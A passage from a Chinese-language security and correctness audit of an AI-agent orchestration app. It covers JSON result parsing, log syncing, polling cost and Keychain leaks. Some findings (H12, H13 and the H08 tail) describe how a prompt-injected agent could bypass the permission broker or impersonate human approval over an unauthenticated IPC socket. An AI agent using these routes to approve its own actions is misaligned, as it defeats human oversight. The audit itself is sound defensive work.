- **核查证据**：cli_providers.rs:89-93 逐条 format!("Bash({value}:*)")、103 行逗号 join 进单个 --allowedTools；值源自仓库内 .agentflow 配置（config_trust.rs:99-105 → agent_run.rs:202），全链路无字符校验——safe_config_text（config_trust.rs:234-243）只做密钥脱敏和 500 字截断，不拒绝逗号/括号；PreToolUse 钩子 matcher 仅 "Bash"（cli_providers.rs:124），注入出的 WebFetch/WebSearch 等非 Bash 工具完全绕过权限 broker。配置变更虽标 high_risk 需人工批准（config_trust.rs:297），但 UI 展示的是原始字符串，语义拆分发生在 Claude CLI 内部。

### H09. JSON 候选扫描在输出截断或杂散大括号时会误吞/误判结果

- **位置**：`crates/agent-adapters/src/support.rs:524`
- **领域**：Provider 适配与契约｜**分类**：正确性
- **状态**：✅ 已修复（2026-07-27）——(1) 候选扫描在 depth==0 也跟踪字符串状态，并在扫描结束仍未闭合时从该 `{` 之后重新扫描，散文里的杂散大括号不再吞掉其后所有真实 JSON；(2) process-supervisor 新增 `read_process_log_truncated`，开发/规划/评审的 stdout.log 回退路径在日志被 64MiB 截断时一律拒绝恢复（只信 result.json / last-message.json 等原子写产物），避免把中途草稿当作权威交付。新增 3 个测试覆盖两种形态。
- **问题**：结果解析取「最后一个 schema 合法的顶层 JSON 对象」，但有两个会产生错误结果的形态：(1) 截断+草稿误判：process-supervisor 把 stdout.log 封顶在 64MiB（process-supervisor/src/lib.rs:27）并置 log_truncated，但 collect 路径从不检查该标志（agent_run.rs / development.rs 只用了 idle_timed_out）。截断使真正的最终结果对象不完整而被丢弃，parse_development（support.rs:370-390）会回退接受更早的候选——而 collect_json_strings（support.rs:392-411）把 stream-json 事件中任意字符串内嵌的 JSON（包括 tool_result 回显的 result.tmp.json 草稿、assistant 文本里的示例）都收进候选池；草稿里的 task_id/revision 是 agent 从 input.md 抄的真值，orchestrator 的校验（development.rs:274）挡不住，于是一份 status=completed 的中途草稿可能被当作权威交付。(2) 吞 JSON：json_object_candidates（support.rs:524-563）在 depth==0 时不进入字符串状态（544 行 `b'"' if depth > 0`），正文里一个未配对的 `{`（例如提示词/日志中的 "{placeholder"）会让 depth 永远回不到 0，其后所有真实 JSON 对象全部无法作为候选提取，解析直接失败并触发不必要的降级重试。
- **未来风险**：长任务的 stream-json verbose 输出很容易接近 64MiB；一旦截断，任务可能带着未完成的代码进入 Validating/Review 流程且状态显示 completed，人工在审批界面看到的摘要来自草稿而非真实结果；杂散大括号形态则会让本来成功的运行被误判为 InvalidResult，消耗重试与预算。
- **改进建议**：collect_result 前检查 outcome.log_truncated，截断即拒绝从 stdout.log 恢复结果（只信 result.json/last-message.json 等原子写产物）；json_object_candidates 在 depth==0 也跟踪字符串状态，并对「扫描结束时 depth>0」的情况从最后一个未闭合 `{` 之后重新扫描；对候选加入来源优先级（顶层对象优先于字符串内嵌对象）。
- **核查证据**：support.rs:544 `b'"' if depth > 0` 使 depth==0 时不跟踪字符串，正文一个未配对 `{` 后 depth 永不归零，其后所有真实 JSON 均不再入候选（support.rs:545-557）；process-supervisor/src/lib.rs:27 MAX_LOG_BYTES=64MiB 且置 log_truncated，但 orchestrator 所有 collect_result 调用点（development.rs:182、review.rs:132、planning.rs:122、adoption.rs:152 等）均不检查该标志；support.rs:267-288 在 result.json 失败后回退整份 stdout.log，parse_development（support.rs:370-390）联合 collect_json_strings（support.rs:392-411）把事件字符串内嵌 JSON 全收进候选，development.rs:274/296 的 task_id/revision/plan_sha256 校验对照抄 input.md 的草稿无效。

### H10. 日志直播流与历史分页无行号对账，导致重复、乱序与缓冲被重置

- **位置**：`apps/desktop/src/hooks/useRunLog.ts:52`
- **领域**：桌面端｜**分类**：正确性/状态一致性
- **状态**：✅ 已修复（2026-07-27）——建立以「绝对行号」为共同坐标的对账机制：后端 `run:log` 事件与 `runLogTail` 分页都带上 `fromLine`/`totalLines`；无法解析的日志行改为产出 `Raw` 事件而不是被丢弃（否则行号会整体错位、去重失效，且 Provider 的畸形输出本身也值得排查时看到）。前端 logStore 重写为按行号 merge：完全落后的批次直接丢弃、部分重叠只取缺失部分、环形缓冲裁剪时同步推进 firstLine；`prependHistory` 真正投入使用（向前补页且裁剪方向修正为保留用户刚请求的旧内容）。useRunLog 改为从**文件末尾**首屏播种（长任务的结构化结果在文件末尾，从头播种会在首页与直播尾巴之间留洞），且缓冲非空时不再整体替换，重进详情页不会丢失已累积的直播内容；滚动到顶触发的 loadMore 现在确实加载更早的页。新增 7 个对账单测。
- **问题**：日志缓冲有三个写入方但没有任何行号对账机制：(1) useRunLog.ts:47-53 每次组件挂载都从 fromLine=0 重新 seed 并用 setHistory 整体替换缓冲（seeded 是组件级 useRef，离开详情页再回来必然重置为文件头 1000 行，已累计的直播尾部全部丢失）；(2) event_bridge.rs:145 对新启动的 run 把直播游标置 0 开始推流，而 UI 侧 seed 也从 0 读盘，同一批行会被 append 第二次（AgentEvent 无行号/ID，无法去重）；(3) loadMore（useRunLog.ts:55-58）把「更早的页」用 append 拼到缓冲【尾部】，TechnicalLog.tsx:94 在滚动到顶部时触发它，期望加载更早输出，实际却把中间页接到直播尾巴后面，顺序完全错乱。logStore.ts:77-92 里为正确做法准备的 prependHistory 从未被任何代码调用（死代码），且其实现超出容量时 slice(0, CAP) 丢的是最新尾部、方向也是反的。另外 RunLogViewer.tsx:39-42 的结果卡片对超过 1000 行的已完成 run 只基于第一页构建，而结构化 result 事件在文件末尾。
- **未来风险**：任何超过 1000 行日志的任务（开发类 run 很容易超过）都会触发：用户离开再进入任务详情页后看到的是日志开头而非最新进展；直播中的 run 出现成片重复行；点「加载更早输出」后日志时间线错乱；长 run 结束后「本次结果」卡片解析不到真正的结论。随着任务复杂度上升这是核心观察路径的必现问题，且用户会以为是 Agent 输出本身错乱，难以自查。
- **改进建议**：给 AgentEvent 或 run:log 批次带上起始行号（后端 event_bridge 已有 cursor，随 payload 一起发即可），logStore 按行号合并去重；初次 seed 改为从文件尾部取最后一页（runLogTail 支持负向或 total-line 查询），loadMore 用 prependHistory 向前补页并修正其截断方向；缓冲已存在且非空时跳过 replace-seed，只做行号续传。
- **核查证据**：useRunLog.ts:21 的 seeded 是组件级 useRef，useRunLog.ts:47-53 每次挂载都以 fromLine=0、replace=true 调 loadPage，setHistory（logStore.ts:59-75）整体替换缓冲为文件头 1000 行，重进详情页必丢已累计直播尾部；event_bridge.rs:145 对新 run 置 log_cursors=0 开始推流，UI seed 同样从 0 读盘，AgentEvent（event_bridge.rs:359-364 可见其字段）无行号/ID 无法去重，seed 读盘快于游标时 append 必产生重复段；loadMore（useRunLog.ts:55-58）把 historyFromLine 处的页 append 到尾部，直播中该页会接在实时尾巴之后（TechnicalLog.tsx:94 滚动到顶触发、TechnicalLog.tsx:190 文案是「已省略更早输出」），顺序错乱；grep 全仓确认 logStore.ts:77-92 的 prependHistory 无任何调用方，且超容量时 slice(0, CAP)（logStore.ts:83）丢弃的是最新尾部；RunLogViewer.tsx:39-42 对已完成 run 用当前 buffer（首页 1000 行）调 buildResultCard，而 resultCard.ts:149 取最后一条 result 事件——超 1000 行的 run 该事件在未加载的文件末尾。全部子claim 均在代码中坐实。

### H11. 事件桥每 300ms 全表扫描 + 全量重读日志文件，随数据增长必然拖垮桌面端

- **位置**：`apps/desktop/src-tauri/src/event_bridge.rs:171`
- **领域**：桌面端｜**分类**：可扩展性/数据增长无界
- **状态**：✅ 已修复（2026-07-27）——(1) `run_log_tail` 新增按字节偏移的增量续读：编排器缓存 run→(行号, 字节偏移, 文件长度)，顺序跟读时只 seek+读取新增部分，成本与新输出成正比而非与整份日志成正比；日志被加密保护（AFENC1）、文件被重写或游标不匹配时自动回退全量读取，半行写入不会推进游标；缓存上限 256 条防止长驻 daemon 无界增长。(2) `load_runs` 不再全表扫描 agent_runs，改为「RUNNING + 正在跟踪的 id + finished_at 水位线」，并在每轮结束后剔除已终止的 run，避免 watched 列表无限增长；水位线重叠 2 秒确保轮询间隙内起止的 run 不漏事件。新增 2 个增量续读回归测试。
- **问题**：event_bridge.rs:284-291 的轮询循环每 300ms 执行：load_tasks（全量 SELECT 所有未删除任务）、load_runs（event_bridge.rs:233-236，SELECT 全部 agent_runs，无任何 WHERE/LIMIT，并逐行 parse 成 RunSummary 重建 HashMap）；对每个 RUNNING 的 run 调 run_log_tail 取增量，而 task_queries.rs:533-538 的实现是把整个 agent-events.jsonl 读进内存、from_utf8_lossy、lines().collect 后再 skip 到游标位置——即每 300ms 重读并切分整个日志文件一次，run_log_line_count（task_queries.rs:552-561）同样全文件读。
- **未来风险**：日志文件随 run 时长线性增长，轮询开销随之线性增长、总 IO 呈平方级：一个产生几十 MB 日志的长任务意味着每秒重读全文件 3 次以上，CPU/磁盘持续被打满，桌面端和同机的 Agent 进程一起变卡；agent_runs 表历史累计到几千行后，即使系统空闲，300ms 一次的全表扫描 + 反序列化也成为常驻背景开销。这是「用得越久越卡」的典型路径，用户无法通过任何设置缓解。
- **改进建议**：run_log_tail 改为记录字节偏移量增量读取（seek 到上次 offset，只读新增部分）；load_runs 加 WHERE 条件（如 status='RUNNING' OR finished_at > 上次轮询时间）或用 updated_at 水位线；load_tasks 同理用 updated_at 增量查询。理想方案是 daemon 侧改推送（本就是 sole writer），事件桥只做兜底轮询并把间隔放宽。
- **核查证据**：event_bridge.rs:11 POLL_INTERVAL=300ms，event_bridge.rs:284-291 循环每轮调 state.poll；poll 内 load_tasks（event_bridge.rs:205-207，SELECT 全部未删除任务）与 load_runs（event_bridge.rs:233-236，SELECT agent_runs 无任何 WHERE/LIMIT 并逐行反序列化重建 HashMap）；对每个活跃 run 调 run_log_tail，其实现（task_queries.rs:533-546）经 read_run_file（data_protection.rs:21-23，走 read_protected_file 还可能含解密开销）把整个 agent-events.jsonl 读入内存、from_utf8_lossy、lines().collect 后 skip 到游标；run_log_line_count（task_queries.rs:552-562）同样全文件读。日志文件线性增长时每 300ms 全量重读属实，无缓存或字节偏移复用，确认为高。

### H12. daemon 本地 IPC 完全没有身份认证，同用户进程可冒充人工批准

- **位置**：`crates/daemon/src/lib.rs:328`
- **领域**：安全专项｜**分类**：安全
- **状态**：✅ 已修复（2026-07-27）——新增 `crates/daemon/src/ipc_auth.rs`：daemon 每次启动生成 32 字节随机会话令牌，以 0600 写入数据目录（临时文件+rename，无部分可读窗口），客户端 `request()` 透明附带；`handle_connection` 在解释命令之前先做恒定时间令牌校验，令牌缺失/伪造一律返回 IPC_UNAUTHORIZED 且不泄露命令是否合法；另加 SO_PEERCRED uid 校验拒绝他用户，并在 bind 前把数据目录收紧为 0700，消除 bind 与 chmod 之间的窗口。新增鉴权拒绝测试（未授权 Shutdown 被拒且 daemon 存活）。**残余风险（已在代码注释中显式记录）**：AgentFlow 启动的 Provider 子进程以同一用户运行且拿到 HOME，仍可读取令牌文件；彻底封堵需要按子进程隔离凭据（沙箱或 broker fd），对应 H13。
- **问题**：`handle_connection`（crates/daemon/src/lib.rs:328-349）从 Unix socket 读一行 JSON 就直接进入 `dispatch`，没有任何调用方身份校验（无 peer credential 检查、无 token、无 nonce）。socket 只靠文件权限保护：`UnixListener::bind` 在 lib.rs:235 先创建，随后 lib.rs:239 才 chmod 0600，中间存在一个短暂的按 umask（通常 0755）可被其他用户连接的窗口；而同一 uid 的任意进程始终可以连接。可用的特权命令包括 `PermissionDecide`（lib.rs:533，最终在 permission_broker.rs:230 以硬编码 `approved_by='human'` 写入决策）、`TaskForceApprove`、`TaskMerge`、`DatabaseBackupRestore`、`PermissionRuleRevoke`。同时 Provider CLI 子进程是以同一用户启动的，并且 `PROVIDER_ENV_KEYS`（crates/agent-adapters/src/support.rs:1）明确把 `HOME` 传给子进程，socket 路径 `$HOME/Library/Application Support/com.agentflow.desktop/agentflowd.sock` 对它们完全可达。
- **未来风险**：任何能在用户账户下执行代码的东西——被提示词注入的 Agent、Agent 执行 `npm install` 时跑的 postinstall 脚本、第三方工具——都能连上 socket 发 `{"command":"permission_decide",...}` 自我批准高危权限，或直接 `task_force_approve` + `task_merge` 跳过整个「人工批准→合并」闭环，而审计表里留下的记录是 `actor='human'`、`approved_by='human'`，事后无法区分真人与冒充者。这会让权限代理与人工闸门在真实攻击面前全部失效。
- **改进建议**：在 accept 之后、dispatch 之前做调用方鉴权：（1）用 `SO_PEERCRED`/`LOCAL_PEERPID` + `getpid` 校验对端 uid 与可执行文件路径，至少拒绝非预期二进制；（2）为桌面端与 daemon 之间引入启动时生成、只存在于 0600 文件或 Keychain 的会话令牌，并在每个请求中校验；（3）把 `PermissionDecide`、`TaskForceApprove`、`TaskMerge`、`DatabaseBackupRestore` 这类「人类语义」命令单独走一条需要令牌的通道，daemon 对无令牌请求一律拒绝并记审计事件；（4）用 `umask(0o077)` 或先 bind 到临时路径 chmod 后 rename，消除 bind 与 chmod 之间的窗口。
- **核查证据**：crates/daemon/src/lib.rs:328-349 的 handle_connection 读一行 JSON 直接进 dispatch，全仓库无 SO_PEERCRED/LOCAL_PEERPID/令牌校验（grep 无任何命中）；特权命令 TaskForceApprove(lib.rs:495)、TaskMerge(519)、PermissionDecide(533)、DatabaseBackupRestore(595) 均无额外闸门，permission_broker.rs:230 硬编码 approved_by='human'，permission_broker.rs:276 事件 actor='human'，事后无法区分冒充者。support.rs:1 确实把 HOME 传给 Provider 子进程。下调为 high 的理由：同 uid 攻击者同样能直接改 0600 的 SQLite 库达到同样效果（整个信任边界本就是 uid），IPC 认证只是缺失的多道边界之一；另外「bind 与 chmod 之间窗口」论据偏弱——umask 022 下 socket 为 0755，其他用户 connect 需要写权限，实际连不上。

### H13. 权限代理只覆盖 Claude，其余 Provider 以 yolo/dontAsk 运行且授权结果从不下发

- **位置**：`crates/agent-adapters/src/cli_providers.rs:420`
- **领域**：安全专项｜**分类**：安全
- **状态**：待修复
- **问题**：只有 Claude 适配器配置了 PreToolUse 钩子（crates/agent-adapters/src/cli_providers.rs:107-134）。其他 Provider 在开发角色下直接以「全自动批准」启动：gemini 用 `--approval-mode yolo`（cli_providers.rs:420）、qwen 同样是 `yolo`（447）、qoder 用 `--permission-mode dont_ask`（540）、grok 用 `dontAsk`（634），全部不产生任何 `permission_request`。与此同时 `permission_authorize`（crates/orchestrator/src/permission_broker.rs:109）在生产代码里没有任何调用方（仅测试与 `permission_effective_for_run` 内部调用），而 `effective_permissions` 只被转发给外部协议 Provider（crates/agent-adapters/src/dynamic.rs:132），内置 CLI 适配器完全忽略它。唯一的边界就是 Provider 自带的 `--sandbox`，而代码从未在运行时验证沙箱是否真的生效。
- **未来风险**：用 gemini/qwen/qoder/grok 作为开发 Agent 时，权限代理事实上不存在：模型可以在沙箱允许范围内任意执行命令且没有任何审计事件。一旦某个 CLI 升级后 `--sandbox` 语义变化、缺少容器运行时而降级为「仅告警继续」，或某个版本忽略该标志，Agent 就是无约束的本地代码执行——再叠加上面第 1 条（IPC 无认证），它可以直接自我批准并合并代码。另外被人工批准的授权也从未真正下发给这些 CLI，用户在 UI 上看到的「已授权命令」与实际执行环境不一致。
- **改进建议**：短期：在 `detect`/运行前对每个非 Claude Provider 做一次沙箱生效性探针（如尝试写工作树外路径、访问网络并断言失败），探针不通过就拒绝以开发角色启动，而不是继续 yolo；把 `permission_authorize` 接到真实执行路径上，或在 UI/文档中明确标注这些 Provider 处于「无代理」模式。中期：为每个 Provider 实现等价的工具调用拦截（钩子或 MCP 代理），并让 `effective_permissions` 真正参与命令行构造，使内置适配器与 `dynamic` 协议保持同一套授权语义。
- **核查证据**：仅 claude_args 装了 PreToolUse 钩子(cli_providers.rs:107-134)；gemini_args:416-420 与 qwen_args:442-446 开发角色用 --approval-mode yolo，qoder_args:539-540 用 --permission-mode dont_ask 且该适配器 detect 要求的 flag 里根本没有 --sandbox(cli_providers.rs:492)，grok_args:633-635 用 dontAsk。permission_authorize 生产侧确实只被 permission_effective_for_run(permission_broker.rs:354) 内部调用；effective_permissions 只在 dynamic.rs:132 转发，cli_providers.rs 全文未读取过该字段（grep 仅命中 lib.rs:98 定义、dynamic.rs、测试）。仓库自有规范 07-...-v1.0-Codex.md:210 明确要求「新 CLI 必须经过与 Claude/Codex 相同的权限代理」，说明这是未达标而非已知取舍，维持 high。

### H14. src-tauri 被排除出 workspace：其测试在 CI 中从不运行，macOS 专属代码从不在 CI 编译

- **位置**：`Cargo.toml:16`
- **领域**：工程化横切面｜**分类**：测试缺口
- **状态**：✅ 已修复（2026-07-27）——CI 新增 `desktop-backend-macos` job（macOS runner 上跑 src-tauri 的 clippy + test，让 `cfg(target_os="macos")` 的 security-framework 代码真正参与编译）；src-tauri/Cargo.toml 补上与 workspace 同级的 lints（forbid unsafe、deny unwrap/expect），并按此修正了 main.rs 的 2 处 expect 与测试中的 expect；scripts/verify.sh 同步新增两步，保持「本地绿=CI 绿」。
- **问题**：根 Cargo.toml 第 16 行 `exclude = ["apps/desktop/src-tauri"]` 把约 2100 行的桌面后端排除出 workspace。ci.yml 的 `cargo test --workspace`（第 16-18 行）与 `cargo clippy --workspace`（第 43 行）因此都不覆盖它；workspace 的 `unwrap_used/expect_used = deny` lint 也不生效。src-tauri 仅有的 3 个测试（apps/desktop/src-tauri/src/provider_setup.rs:283-339，恰是安装器闭合白名单、Keychain service 白名单、Keychain 读写这三个安全边界测试）在 CI 和 scripts/verify.sh 中都从未执行。desktop-contract 任务只在 ubuntu 上通过 xtask 编译 src-tauri，而 `[target.'cfg(target_os = "macos")']` 的 security-framework 代码（src-tauri/Cargo.toml 第 25-26 行）在 ubuntu 上被 cfg 裁掉——macOS 专属代码只有打 tag 触发 release-macos.yml 时才第一次编译。
- **未来风险**：近期 hardening 提交（权限代理、resume token 保护）大量落在 src-tauri；一次回归（比如白名单被放开、Keychain service 拼错）会带着绿色 CI 合入。macOS 专属代码的编译错误会潜伏到发版打 tag 那一刻才爆炸，直接阻塞发布流程。
- **改进建议**：在 ci.yml 的 core 矩阵 macos job（或 desktop-contract 增加 macos runner）追加 `cargo test --manifest-path apps/desktop/src-tauri/Cargo.toml` 与对应 clippy；同时把 workspace 的 [lints] 复制进 src-tauri/Cargo.toml。scripts/verify.sh 第 56 行之后加同样的步骤，保持“本地绿=CI 绿”的承诺。
- **核查证据**：Cargo.toml:16 确有 exclude = ["apps/desktop/src-tauri"]；ci.yml:16-18 的 cargo test --workspace 与 ci.yml:43 的 clippy --workspace 因此都不覆盖 src-tauri，verify.sh 全文也无 src-tauri 测试步骤；实测 src-tauri 共 2096 行、4 个测试（provider_setup.rs:283/296/315 三个安全边界测试外加 event_bridge.rs:318，原报告说 3 个略有偏差但结论不变），其中 keychain 测试（provider_setup.rs:314-340）带 cfg(target_os="macos")；src-tauri/Cargo.toml:24-25 的 security-framework 仅在 macOS 编译，而唯一编译 src-tauri 的 desktop-contract 任务跑在 ubuntu-latest（ci.yml:33，经 ci.yml:48 xtask 间接编译），macOS 路径只有 release-macos.yml（tag/手动触发）才编译；src-tauri/Cargo.toml 中也确无 [lints] 段继承 workspace 的 unwrap_used/expect_used = deny（根 Cargo.toml:70-72）。

## 中危（Medium）

### M01. 守护进程优雅停机的 requeue 不重置 worktree，被中断开发者的半成品会污染下一轮修订

- **位置**：`crates/orchestrator/src/lifecycle.rs:234`
- **领域**：编排器核心｜**分类**：崩溃/重启后状态一致性
- **状态**：待修复
- **问题**：崩溃恢复路径会先 create_checkpoint 再把 worktree 重置到上一修订提交或 base_commit（lifecycle.rs:134-153），但优雅停机路径 requeue_interrupted_tasks（lifecycle.rs:234-271）只回退任务状态和 current_revision，完全不碰 worktree。develop() 的首个候选 Provider 也从不重置 worktree（重置只发生在 fallback 时，development.rs:74-75），并且 commit_revision 会提交 worktree 里的全部变更。
- **未来风险**：用户在开发者 CLI 运行到一半时关闭 daemon（正常退出而非崩溃），CLI 进程组被终止后半完成的编辑留在 worktree；重启后任务从 ReadyForDevelopment 重跑，新一轮 Provider 在被污染的 worktree 上工作，最终修订混入上一次被杀进程的残留改动——可能触发 plan_deviations 误判（路径超出 allowed_paths 被打回重审批），或让审查者看到无人能解释的 diff。与崩溃路径行为不一致使问题难以复现定位。
- **改进建议**：在 requeue_interrupted_tasks 中对 Developing/Revising 任务复用崩溃恢复的逻辑：先 create_checkpoint('shutdown-interrupted') 保留残留编辑，再 reset_owned_worktree 到上一修订提交或 base_commit；Reviewing 任务重置到修订提交。或者更简单：让 develop() 对第一个候选也无条件重置到 baseline。
- **核查证据**：属实：requeue_interrupted_tasks（lifecycle.rs:234-271）只回退 current_revision 和状态，完全不碰 worktree，而崩溃恢复路径在 lifecycle.rs:135-153 会先 create_checkpoint 再 reset_owned_worktree 到上一修订或 base_commit，两条路径行为不一致；develop() 仅在 fallback 分支重置 worktree（development.rs:73-75 `if let Some(from) = previous`），首个候选直接以脏 worktree 的 HEAD 为 baseline 运行，git-engine/src/lib.rs:327 `git add -A` 会把被杀 CLI 的半完成编辑一并提交进新修订。

### M02. acquire_provider_dispatch 无限自旋且不感知停机/取消，令牌注册在获取槽位之后，停机可无限期挂起

- **位置**：`crates/orchestrator/src/scheduler_limits.rs:18`
- **领域**：编排器核心｜**分类**：并发/死锁
- **状态**：待修复
- **问题**：acquire_provider_dispatch 是一个仅在任务变为 Cancelled 时才退出的 250ms 轮询死循环（scheduler_limits.rs:18-57），没有截止时间、不检查 CancellationToken 和 daemon 停机信号。而 run_agent 里 register_cancellation 发生在 acquire 之后（agent_run.rs:206-218），因此正在等待槽位的 worker 对 interrupt_active_runs（lifecycle.rs:222-231）完全不可见。另外 requests_per_minute 的 COUNT 检查与 dispatch_history 插入不是原子的（25-53 行），并发 acquire 会超发。
- **未来风险**：停机序列（daemon/src/scheduler.rs:10-27）先 interrupt_active_runs 再 `running.join_next()` 等待全部 worker：若某 worker 正在 acquire 自旋，它收不到中断；等其他任务释放槽位后它会在『停机中』启动一个全新的 Provider 运行（其 token 注册于中断广播之后，永远不会被取消），停机被拖到整个开发超时（默认 1800 秒）甚至更久；若槽位被卡住的收养运行长期占用，停机永久挂起，用户只能强杀 daemon——进而又走崩溃恢复路径。
- **改进建议**：给 acquire_provider_dispatch 传入 CancellationToken（在创建 run 时就 register），循环中 select 该 token；停机时先置一个全局 draining 标志让 acquire 立即返回错误；对 RPM 用单条带条件的 INSERT（或事务）消除检查-插入竞态；并给等待设置上限（如 10 分钟）超时后报 InvalidState 让任务走正常失败路径。
- **核查证据**：属实：scheduler_limits.rs:18-57 是仅在任务 Cancelled 时退出的 250ms 轮询死循环，无截止时间、不检查 CancellationToken；agent_run.rs:206-218 中 register_cancellation 在 acquire 成功之后才执行，而 interrupt_active_runs（lifecycle.rs:222-231）只取消已注册令牌，停机序列（daemon/src/scheduler.rs:13-19 先 interrupt 再 join_next 等待全部 worker）对正在自旋的 worker 不可见——它拿到槽位后会在停机中启动全新 Provider 运行且其令牌永不被取消，停机被拖到运行超时（默认 1800 秒）；RPM 的 COUNT 检查（25-32 行）与 dispatch_history 插入（46-51 行）确非原子，并发可超发。『永久挂起』仅在收养运行长期占满槽位时成立，属边缘情形，medium 恰当。

### M03. review issue 的 resolved 判定仅凭 file+title 匹配，Provider fallback 换评审者时会批量误标『已解决』

- **位置**：`crates/orchestrator/src/review.rs:392`
- **领域**：编排器核心｜**分类**：数据完整性
- **状态**：待修复
- **问题**：reconcile_review_issues 把所有早于当前修订、resolved=0 的问题，与本轮评审 issue 的 (file, 归一化 title) 键集合比对，不在集合中的一律置 resolved=1（review.rs:392-435，键构造见 support.rs:541-549）。当评审链发生 fallback（review.rs:54-70）或委员会成员变化时，本轮由不同 Provider 评审，同一问题几乎必然换措辞，旧问题会被整体误标为『本轮已解决』。同时 §34 旧问题重现检测（convergence.rs:78-90）要求键在上一轮缺席、更早轮出现，换 Provider 后同样永远匹配不上。
- **未来风险**：开发者主评审 CLI 掉线一轮后：r1 由 Codex 报出的 3 个 high 问题，在 r2 由 Claude 用不同标题重报，r1 的记录被标 resolved_by_revision=2 且写入 review:issues_resolved 事件——审计里显示问题被修复而实际从未修复；convergence 的 Regressed/Stalled 判定失真，人工批准界面上『未解决 critical/high』计数（governance.rs:535-538 只查当前修订）也无法追溯这些被洗掉的问题，质量门的历史维度被架空。
- **改进建议**：把 resolved 判定限定在『同一 reviewer_agent（或同一家族）连续两轮』的比较内；跨 Provider 轮次不自动 resolve，而是标记为 stale/needs-recheck 并把旧问题清单注入下一轮评审输入让评审者显式确认；或在键中加入 line_start 附近的代码指纹降低误匹配。
- **核查证据**：属实：reconcile_review_issues（review.rs:392-424）把所有早于当前修订、resolved=0 的问题按 (file, 归一化 title) 键（support.rs:541-549）与本轮 issue 集合比对，缺席即置 resolved=1 并写 review:issues_resolved 事件（review.rs:417-432），查询不区分 reviewer_agent；评审 fallback 换 Provider（review.rs:54-70）后同一问题换措辞几乎必然键不匹配而被整体误标。convergence.rs 的 resolved_issue_reappeared 同样按精确键匹配，代码注释自认『rephrased issue simply doesn't match』——对重现检测是 safe miss，但对 resolve 判定正是误标方向。

### M04. 单评审模式的独立性只排除同一个 Provider，fallback 后同厂商 API 可评审自家 CLI 的产出

- **位置**：`crates/orchestrator/src/review.rs:361`
- **领域**：编排器核心｜**分类**：治理/独立性保证
- **状态**：待修复
- **问题**：provider_chain 对评审角色的排除条件是 `excluded.as_ref() != Some(kind)`（review.rs:361），仅排除与实际开发者完全相同的 AgentKind；而委员会模式明确按厂商家族隔离（review_council.rs:186-188 配合 provider_family，review_council.rs:493-502 把 Codex/OpenAiApi、ClaudeCode/AnthropicApi 等归为同族）。单评审模式下开发者为 Codex 时，reviewer_fallbacks 或 api_fallback_provider 里的 OpenAiApi 不会被过滤。
- **未来风险**：主评审 Provider 认证过期或超时后自动降级（这正是 fallback 的常态触发），最终由与开发者同厂商同底座模型的 API 完成『独立评审』并给出 pass，直接进入人工批准环节；工作流对外承诺的『评审者独立于产出者』被静默削弱，且事件流里只有一条普通的 provider:fallback 记录，用户难以察觉。这类同源模型对自家输出的盲区正是双评审设计要防御的。
- **改进建议**：把单评审链的排除条件升级为家族级：`provider_family(kind) != provider_family(actual_developer)`，与委员会模式对齐；若过滤后链为空，宁可 Blocked(ReviewFailed) 提示用户接入第二家 Provider，也不要静默用同族模型评审。
- **核查证据**：属实：provider_chain 对评审角色的排除条件是 review.rs:361 `.filter(|kind| excluded.as_ref() != Some(kind))`，仅排除与实际开发者完全相同的 AgentKind；而委员会模式在 review_council.rs:184-190 用 provider_family 做家族隔离，review_council.rs:494-500 明确把 Codex/OpenAiApi、ClaudeCode/AnthropicApi 归为同族。review_council.rs:53-54 表明委员会未启用时走 review_single，此时开发者为 Codex 而 reviewer_fallbacks/api_fallback_provider 含 OpenAiApi 不会被过滤，fallback 后由同厂商模型完成『独立评审』，事件流仅留一条 provider:fallback 记录（review.rs:437-456）。

### M05. 每次运行都向 Keychain 写入 resume token，任务清除后永不删除，秘密无限累积

- **位置**：`crates/orchestrator/src/telemetry.rs:105`
- **领域**：持久化层｜**分类**：资源泄漏/安全
- **状态**：待修复
- **问题**：telemetry.rs:104-117 在每个带 session_id 的 Provider 运行结束时调用 store.put_resume_token，为其在 macOS 登录 Keychain 的 com.agentflow.provider-resume 服务下新建一条 resume-<uuid> 条目（resume_tokens.rs:20-31 每次生成新引用，从不覆盖旧条目）。但删除路径只有 permission_broker.rs:100/293 处理自己那一类引用；agent_runs.session_secret_ref 指向的条目没有任何删除方：storage.rs:372-435 的 purge_task 只删数据库行和文件目录，agent_run.rs:164 也只读取最新一条。
- **未来风险**：两方面：1) 用户登录 Keychain 中的条目随每次 agent 运行线性增长（一个活跃用户一年可积累数千条），且永远不会被清理；2) 迁移 0022 的承诺是『任务数据删除后秘密不残留』，但用户把任务从回收站彻底清除后，能够恢复 Provider 会话的凭据仍完整留在 Keychain 里，隐私删除语义被破坏。
- **改进建议**：在 purge_task 事务提交前先 SELECT 出该任务所有 agent_runs.session_secret_ref 与 permission_requests.provider_resume_secret_ref，逐一调用 delete_resume_token（失败记日志）；在 put_resume_token 覆盖同一 run 语义时删除被替换的旧引用；另加一个维护任务清理数据库中已无引用的 Keychain 条目。
- **核查证据**：crates/orchestrator/src/telemetry.rs:104-117 每个带 session_id 的运行结束都调用 put_resume_token，crates/persistence/src/resume_tokens.rs:20 每次生成新 resume-<uuid> 并写入 Keychain（com.agentflow.provider-resume），从不覆盖旧条目；全仓 grep 确认 delete_resume_token 仅有两处调用：permission_broker.rs:100（事务提交失败回滚）和 :293（Deny/CancelTask 决策），agent_runs.session_secret_ref 无任何删除方；storage.rs:372-435 purge_task 只 DELETE 数据库行（agent_runs 在 :398 表清单中）和删除文件目录，不触碰 Keychain；permission_expire_pending（permission_broker.rs:307-327）过期时也只改 status 不删 token，过期请求的 provider_resume_secret_ref 同样残留。迁移 0022 注释明言 resume 凭据是秘密而非审计事实，purge 后 Keychain 中仍可恢复 Provider 会话，隐私删除语义确实被破坏

### M06. daemon 每次启动都全量 VACUUM 备份并把整库读进内存加密，启动耗时/内存随库无界增长且桌面端无超时阻塞

- **位置**：`crates/persistence/src/protection.rs:166`
- **领域**：持久化层｜**分类**：可扩展性瓶颈
- **状态**：待修复
